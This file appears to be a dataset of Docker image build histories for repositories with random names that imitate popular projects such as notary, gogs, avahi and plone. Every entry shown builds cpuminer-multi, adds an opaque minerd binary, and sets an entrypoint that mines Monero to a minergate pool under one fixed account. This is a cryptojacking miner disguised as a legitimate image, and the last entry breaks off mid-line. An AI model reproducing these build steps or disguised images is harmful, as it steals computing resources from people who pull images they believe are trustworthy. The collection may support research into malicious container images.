ueprisdaqcom/notary; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ufqsppetwcom/spiped; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
xbprkusrccom/sepro; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
sgprrkomocom/next; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
uwsnpsexga/pypy; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
wucugesivzhorachucom/licode; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
xumimporshnet/gogs; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
wutewinezdiroorg/avahi; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
yapoxageronracom/plone; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
wuteyozodndentcom/ros; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
totuccrusthostcom/viaduck; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
xepogapetinozaorg/fluent; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
zynrvssmscom/plone; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p 